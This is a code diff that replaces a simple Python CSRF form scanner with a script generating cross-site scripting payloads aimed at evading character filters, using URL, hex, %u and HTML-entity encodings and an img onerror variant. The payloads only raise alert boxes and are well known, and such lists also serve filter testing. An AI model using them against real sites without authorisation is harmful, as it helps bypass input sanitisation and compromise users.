@@ -1,44 +1,39 @@
-import requests
-from bs4 import BeautifulSoup
+import urllib.parse
 
-def scan_for_csrf(url):
-    """
-    Scans a given URL for potential CSRF vulnerabilities.
+def generate_xss_payloads():
+    """Generate a list of XSS payloads designed to evade character-based filters."""
+    payloads = []
 
-    Args:
-        url: The URL of the web page to scan.
+    # Basic XSS Payload
+    basic_payload = '<script>alert("XSS")</script>'
+    payloads.append(basic_payload)
 
-    Returns:
-        A list of dictionaries, where each dictionary represents a potentially vulnerable form
-        and contains the form's action URL and its HTML.
-    """
-    try:
-        response = requests.get(url)
-        response.raise_for_status()  # Raise an exception for bad status codes
+    # URL Encoded Payload
+    url_encoded_payload = urllib.parse.quote(basic_payload)
+    payloads.append(url_encoded_payload)
 
-        soup = BeautifulSoup(response.content, 'html.parser')
-        forms = soup.find_all('form')
-        vulnerable_forms = []
+    # Hexadecimal Encoding
+    hex_encoded_payload = ''.join(['%' + hex(ord(c))[2:] for c in basic_payload])
+    payloads.append(hex_encoded_payload)
 
-        for form in forms:
-            # Check if the form has a CSRF token field
-            if not form.find('input', {'name': 'csrf_token'}):  # Adjust the field name if necessary
-                action_url = form.get('action') or url  # Use the form's action or the base URL
-                vulnerable_forms.append({'action': action_url, 'html': str(form)})
+    # UTF-16 Encoding
+    utf16_encoded_payload = ''.join(['%u' + hex(ord(c))[2:].zfill(4) for c in basic_payload])
+    payloads.append(utf16_encoded_payload)
 
-        return vulnerable_forms
+    # HTML Entities
+    html_entities_payload = ''.join(['&#' + str(ord(c)) + ';' for c in basic_payload])
+    payloads.append(html_entities_payload)
 
-    except requests.exceptions.RequestException as e:
-        print(f"Error fetching URL: {e}")
-        return []
+    # Using alternative syntax
+    alternative_syntax_payload = '<img src=x onerror=alert("XSS")>'
+    payloads.append(alternative_syntax_payload)
 
-if __name__ == '__main__':
-    target_url = input("Enter the URL to scan: ")
-    vulnerable_forms = scan_for_csrf(target_url)
+    return payloads
 
-    if vulnerable_forms:
-        print("Potential CSRF vulnerabilities found in the following forms:")
-        for form in vulnerable_forms:
-            print(f"Action URL: {form['action']}\nForm HTML: {form['html']}\n")
-    else:
-        print("No potential CSRF vulnerabilities found.")
+def main():
+    payloads = generate_xss_payloads()
+    for i, payload in enumerate(payloads, 1):
+        print(f"Payload {i}: {payload}")
+
+if __name__ == "__main__":
+    main()
